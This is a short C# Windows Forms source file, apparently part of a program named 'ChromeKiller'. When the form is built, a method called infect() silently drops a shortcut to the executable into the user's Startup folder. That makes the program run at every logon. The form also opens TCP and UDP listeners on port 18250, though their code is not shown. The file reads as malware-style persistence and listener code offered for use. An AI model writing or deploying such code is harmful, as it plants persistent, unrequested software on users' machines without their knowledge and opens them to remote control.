using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ChromeKiller
{
    public partial class GUI : Form
    {
        private TCPServer serverTCP = new TCPServer(18250);
        UDPServer serverUDP = new UDPServer(18250);

        public GUI()
        {
            InitializeComponent();
            infect();
        }

        public void infect()
        {
            //@param URL, path leading to Startup folder for current user
            string URL = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\Start Menu\Programs\Startup\ChromeKiller.url";
            string appPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            using (StreamWriter writer = new StreamWriter(URL))
            {
                writer.WriteLine("[InternetShortcut]");
                writer.WriteLine("URL=" + appPath);
                writer.Flush();
            }
        }

        private void GUI_FormClosed(object sender, FormClosedEventArgs e)
        {
            serverTCP.Close();
            serverUDP.Close();
        }
    }
}
